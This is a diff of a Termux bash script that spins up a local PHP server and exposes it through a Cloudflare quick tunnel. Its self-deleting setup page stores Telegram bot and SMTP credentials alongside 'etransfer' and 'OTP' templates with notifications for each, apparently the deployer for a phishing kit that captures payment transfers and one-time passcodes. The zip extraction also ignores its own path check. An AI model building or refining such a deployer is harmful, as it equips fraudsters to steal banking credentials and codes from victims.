@@ -1,170 +1,150 @@
 #!/data/data/com.termux/files/usr/bin/bash
 set -euo pipefail
-# run_tools.sh — launches a mobile web app and prints the trycloudflare URL/endpoint /tools.php
 
+# --- CONFIG ---
 BASE="$(pwd)"
 WWW="$BASE/.www"
+CFG="$BASE/config"
 LOGS="$BASE/.logs"
-WAIT=20
+PHP_LOG="$LOGS/php.log"
+CF_LOG="$LOGS/cloudflared.log"
+PORT=$((RANDOM%64512+1024))
+WAIT=2
 
-_err(){ printf 'ERROR: %s\n' "$1" >&2; exit 1; }
+mkdir -p "$WWW" "$CFG" "$LOGS"
+: > "$PHP_LOG" : > "$CF_LOG"
+chmod 600 "$PHP_LOG" "$CF_LOG" 2>/dev/null || true
 
-mkdir -p "$WWW" "$LOGS" || _err "mkdir failed"
+# --- 1) Ensure Cloudflared installed ---
+if ! command -v cloudflared >/dev/null 2>&1; then
+    pkg update -y
+    pkg install cloudflared -y
+fi
 
-need_pkg(){
-  for p in "$@"; do
-    command -v "$p" >/dev/null 2>&1 || { pkg update -y >/dev/null 2>&1 || true; pkg install -y "$p" >/dev/null 2>&1 || _err "install $p"; }
-  done
-}
-need_pkg php cloudflared curl lsof unzip
-
-# write tools.php (mobile-friendly dark UI: upload/unzip, list files, open splash/index)
-cat > "$WWW/tools.php" <<'PHP'
+# --- 2) Tools.php: Config + Web builder ---
+TOOLS="$WWW/tools.php"
+cat > "$TOOLS" <<'PHP'
 <?php
-// tools.php — dark mobile web app: upload .zip, unzip into webroot, show files, open index/splash
 session_start();
-$msg=''; $files=[];
-if ($_SERVER['REQUEST_METHOD']==='POST' && !empty($_FILES['zipfile']['tmp_name'])) {
-  $u=$_FILES['zipfile'];
-  if($u['error']!==UPLOAD_ERR_OK){ $msg='Upload error'; }
-  else{
-    $ext=strtolower(pathinfo($u['name'],PATHINFO_EXTENSION));
-    if($ext!=='zip'){ $msg='Please upload a .zip file'; }
-    else{
-      $tmpzip=sys_get_temp_dir().'/upload_'.uniqid().'.zip';
-      if(!move_uploaded_file($u['tmp_name'],$tmpzip)){ $msg='Failed to move upload'; }
-      else{
-        $zip = new ZipArchive();
-        if($zip->open($tmpzip)===true){
-          $_SESSION['progress']=[]; $_SESSION['total']=$zip->numFiles;
-          $ok=true;
-          for($i=0;$i<$zip->numFiles;$i++){
-            $fn=$zip->getNameIndex($i);
-            if(strpos($fn,'..')!==false||strpos($fn,':')!==false||substr($fn,0,1)==='/'){ $ok=false; $msg='Unsafe zip paths'; break; }
-            $zip->extractTo(__DIR__,[$fn]);
-            $_SESSION['progress'][]=$fn;
-            // collect for UI immediately
-            $files[]=$fn;
-            // flush session per-file for polling UIs if needed
-            session_write_close();
-            session_start();
-          }
-          $zip->close();
-          if($ok) $msg='Unpacked successfully';
-        } else $msg='Invalid zip file';
-        @unlink($tmpzip);
-      }
-    }
-  }
+$msg=''; $ok=false;
+$www=__DIR__; $cfg_dir=dirname($www).'/config'; @mkdir($cfg_dir,0755,true);
+if ($_SERVER['REQUEST_METHOD']==='POST') {
+    // Handle config save
+    $post=array_map('trim',$_POST);
+    $cfg=[
+        'telegram'=>[
+            'token'=>$post['telegram_token']??'',
+            'chat_id'=>$post['telegram_chat_id']??'',
+            'controller'=>$post['telegram_controller']??''
+        ],
+        'smtp'=>[
+            'host'=>$post['smtp_host']??'',
+            'port'=>(int)($post['smtp_port']??587),
+            'user'=>$post['smtp_user']??'',
+            'pass'=>$post['smtp_pass']??'',
+            'from'=>$post['smtp_from']??($post['smtp_user']??'')
+        ],
+        'templates'=>[
+            'etransfer'=>$post['etransfer_template']??'templates/etransfer.html',
+            'otp'=>$post['otp_template']??'templates/otp.html'
+        ],
+        'notice'=>[
+            'etransfer'=>isset($post['notice_etransfer']),
+            'otp'=>isset($post['notice_otp'])
+        ]
+    ];
+    $cfg_php="<?php\nreturn ".var_export($cfg,true).";\n";
+    if(file_put_contents($cfg_dir.'/config.php',$cfg_php) !== false){
+        chmod($cfg_dir.'/config.php',0600);
+        $ok=true;
+        @unlink(__FILE__);
+    }else{$msg='Failed to save config.';}
 }
-// simple file listing of webroot (non-recursive top-level)
-$dh = @opendir(__DIR__);
-$list = [];
-if ($dh) {
-  while(false !== ($f = readdir($dh))) {
-    if ($f === '.' || $f === '..') continue;
-    if ($f === basename(__FILE__)) continue;
-    $list[] = $f;
-  }
-  closedir($dh);
-  sort($list);
+
+// Handle web zip upload
+if(isset($_FILES['zipfile']['tmp_name'])){
+    $tmp=$_FILES['zipfile']['tmp_name'];
+    if($_FILES['zipfile']['error']===UPLOAD_ERR_OK){
+        $zip=new ZipArchive();
+        if($zip->open($tmp)===true){
+            for($i=0;$i<$zip->numFiles;$i++){
+                $f=$zip->getNameIndex($i);
+                if(strpos($f,'..')!==false) continue;
+                $zip->extractTo($www);
+            }
+            $zip->close();
+            $msg="Files unpacked successfully. Redirecting to index.php...";
+            echo "<script>setTimeout(()=>location='index.php',1500)</script>";
+        }else{$msg='Invalid zip file.';}
+    }else{$msg='Upload error.';}
 }
+
+function esc($s){return htmlspecialchars($s,ENT_QUOTES);}
 ?>
-<!doctype html><html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Tools</title>
+<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Web Builder & Config</title>
 <style>
-:root{--bg:#0b0f12;--card:#0f1519;--accent:#1f6feb;--muted:#9fb1cc;--ok:#a8ffb0}
-body{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;background:var(--bg);color:#e6eef6}
-.container{padding:16px;max-width:720px;margin:0 auto}
-.header{display:flex;align-items:center;gap:12px}
-.logo{width:44px;height:44px;border-radius:10px;background:linear-gradient(135deg,#163f90,#1f6feb);display:flex;align-items:center;justify-content:center;font-weight:700}
-h1{font-size:18px;margin:0}
-.card{background:var(--card);padding:12px;border-radius:10px;margin-top:12px}
-input[type=file]{width:100%;padding:10px;border-radius:8px;background:#0d1215;border:1px solid #222;color:#fff}
-button{width:100%;padding:10px;border-radius:8px;border:0;background:var(--accent);color:#fff;margin-top:8px;font-weight:600}
-.list{margin:8px 0 0;padding:0;list-style:none;max-height:220px;overflow:auto}
-.list li{padding:8px;border-bottom:1px solid rgba(255,255,255,0.03);font-size:14px;color:var(--muted)}
-.msg{margin-top:8px;padding:8px;border-radius:8px;background:#08171b;color:var(--ok)}
-.toolbar{display:flex;gap:8px;margin-top:12px}
-.small{flex:1;padding:8px;border-radius:8px;background:#071021;color:#cfe8ff;text-align:center}
-a.btnlink{display:block;color:inherit;text-decoration:none}
-</style>
-</head><body>
+body{font-family:system-ui;background:#0b0f12;color:#e6eef6;padding:16px}
+.container{max-width:720px;margin:auto}
+.card{background:#0f1519;padding:12px;border-radius:10px;margin-bottom:12px}
+input,button{width:100%;margin-top:6px;padding:8px;border-radius:6px;border:none;background:#1f6feb;color:#fff}
+label{font-size:13px;color:#9fb1cc;margin-top:6px;display:block}
+.err{background:#3a0b0b;color:#ffb3b3;padding:6px;border-radius:6px}
+.ok{background:#07220b;color:#a8ffb0;padding:6px;border-radius:6px}
+</style></head><body>
 <div class="container">
-  <div class="header">
-    <div class="logo">T</div>
-    <div><h1>Tools</h1><div style="font-size:12px;color:var(--muted)">Mobile web tools</div></div>
-  </div>
-
-  <div class="card">
-    <form method="post" enctype="multipart/form-data" id="uploadForm">
-      <label style="font-size:13px;color:var(--muted)">Upload webroot .zip (will overwrite webroot files)</label>
-      <input type="file" name="zipfile" accept=".zip" required>
-      <button type="submit">Upload &amp; Unzip</button>
-    </form>
-    <?php if($msg): ?><div class="msg"><?=htmlspecialchars($msg,ENT_QUOTES)?></div><?php endif; ?>
-    <div class="toolbar">
-      <div class="small"><a class="btnlink" href="index.php">Open index</a></div>
-      <div class="small"><a class="btnlink" href="splash.php">Open splash</a></div>
-    </div>
-  </div>
-
-  <div class="card">
-    <div style="font-size:13px;color:var(--muted)">Files in webroot</div>
-    <ul class="list">
-      <?php foreach($list as $f): ?>
-        <li><a href="<?=rawurlencode($f)?>" style="color:inherit;text-decoration:none"><?=htmlspecialchars($f,ENT_QUOTES)?></a></li>
-      <?php endforeach; ?>
-    </ul>
-  </div>
-
-  <div style="height:28px"></div>
-</div>
-</body></html>
+<h2>Config & Web Builder</h2>
+<?php if($msg): ?><div class="<?= $ok?'ok':'err' ?>"><?=esc($msg)?></div><?php endif; ?>
+<div class="card">
+<form method="post" enctype="multipart/form-data">
+<h3>Upload Web Zip</h3>
+<input type="file" name="zipfile" accept=".zip" required>
+<button type="submit">Upload & Extract</button>
+</form>
+<form method="post" style="margin-top:12px">
+<h3>Telegram</h3>
+<label>Bot token</label><input type="text" name="telegram_token" value="<?=esc($_POST['telegram_token']??'')?>">
+<label>Chat ID</label><input type="text" name="telegram_chat_id" value="<?=esc($_POST['telegram_chat_id']??'')?>">
+<label>Controller</label><input type="text" name="telegram_controller" value="<?=esc($_POST['telegram_controller']??'')?>">
+<h3>SMTP</h3>
+<label>Host</label><input type="text" name="smtp_host" value="<?=esc($_POST['smtp_host']??'')?>">
+<label>Port</label><input type="number" name="smtp_port" value="<?=esc($_POST['smtp_port']??'587')?>">
+<label>User</label><input type="text" name="smtp_user" value="<?=esc($_POST['smtp_user']??'')?>">
+<label>Password</label><input type="password" name="smtp_pass" value="<?=esc($_POST['smtp_pass']??'')?>">
+<label>From (optional)</label><input type="text" name="smtp_from" value="<?=esc($_POST['smtp_from']??'')?>">
+<h3>Templates & Notices</h3>
+<label>E-Transfer template</label><input type="text" name="etransfer_template" value="<?=esc($_POST['etransfer_template']??'templates/etransfer.html')?>">
+<label>OTP template</label><input type="text" name="otp_template" value="<?=esc($_POST['otp_template']??'templates/otp.html')?>">
+<label><input type="checkbox" name="notice_etransfer" <?=isset($_POST['notice_etransfer'])?'checked':''?>> Notify on e-transfer</label>
+<label><input type="checkbox" name="notice_otp" <?=isset($_POST['notice_otp'])?'checked':''?>> Notify on OTP</label>
+<button type="submit">Save Config & Remove tools.php</button>
+</form>
+</div></div></body></html>
 PHP
 
-chmod 644 "$WWW/tools.php" 2>/dev/null || true
-[ -f "$WWW/index.php" ] || printf '<!doctype html><html><head><meta charset="utf-8"><title>Index</title></head><body><h1>Index</h1></body></html>' > "$WWW/index.php"
-[ -f "$WWW/splash.php" ] || printf '<!doctype html><html><head><meta charset="utf-8"><title>Splash</title></head><body><h1>Splash</h1></body></html>' > "$WWW/splash.php"
+chmod 644 "$TOOLS"
 
-# pick free port
-pick_port(){ for i in $(seq 1 60); do p=$((20000 + RANDOM % 30000)); if ! ss -ltn 2>/dev/null | grep -q ":$p\b"; then printf '%s' "$p"; return 0; fi; done; return 1; }
-PORT=$(pick_port) || _err "no free port"
-
-PHP_LOG="$LOGS/php_${PORT}.log"
-CF_LOG="$LOGS/cloudflared_${PORT}.log"
-: > "$PHP_LOG" : > "$CF_LOG"
-
-# kill any process on that port
-if command -v lsof >/dev/null 2>&1; then
-  for pid in $(lsof -ti :"$PORT" 2>/dev/null || true); do kill -9 "$pid" 2>/dev/null || true; done
-fi
+# --- 3) Start PHP server ---
 pkill -f "php -S 127.0.0.1:${PORT}" 2>/dev/null || true
+nohup php -S 127.0.0.1:${PORT} -t "$WWW" >"$PHP_LOG" 2>&1 &
+PHP_PID=$!
+sleep 0.8
+echo "[INFO] PHP PID: $PHP_PID, serving .www on port $PORT"
+
+# --- 4) Start Cloudflared tunnel ---
 pkill -f "cloudflared tunnel --url" 2>/dev/null || true
-sleep 0.2
-
-nohup php -S 127.0.0.1:"${PORT}" -t "$WWW" >"$PHP_LOG" 2>&1 &
-sleep 0.9
-
-_ok=0
-for i in 1 2 3 4 5; do
-  if curl -fs "http://127.0.0.1:${PORT}/tools.php" 2>/dev/null | grep -qi 'Upload'; then _ok=1; break; fi
-  sleep 0.6
-done
-[ "$_ok" -eq 1 ] || { tail -n 24 "$PHP_LOG" 2>/dev/null || _err "php not responding on ${PORT}"; }
-
 nohup cloudflared tunnel --url "http://127.0.0.1:${PORT}" --loglevel info >"$CF_LOG" 2>&1 &
-sleep 1.5
+CLOUD_PID=$!
+sleep 2
 
-END=$((SECONDS + WAIT))
-PUBLIC=""
+# --- 5) Wait for public URL ---
+END=$((SECONDS+20))
+PUBLIC_URL=""
 while [ $SECONDS -le $END ]; do
-  PUBLIC=$(grep -Eo 'https?://[a-z0-9-]+\.trycloudflare\.com' "$CF_LOG" 2>/dev/null | tail -n1 || true)
-  [ -n "$PUBLIC" ] && break
-  sleep 1
+    PUBLIC_URL=$(grep -Eo 'https?://[a-z0-9-]+\.trycloudflare\.com' "$CF_LOG" 2>/dev/null | tail -n1 || true)
+    [ -n "$PUBLIC_URL" ] && break
+    sleep 1
 done
-[ -n "$PUBLIC" ] || _err "no public link found"
 
-# print only the public URL that points to tools.php
-printf '%s\n' "${PUBLIC%/}/tools.php"
+echo "[INFO] Public URL: ${PUBLIC_URL:-NOT FOUND}"
+echo "[INFO] Access tools.php to setup web app and config."
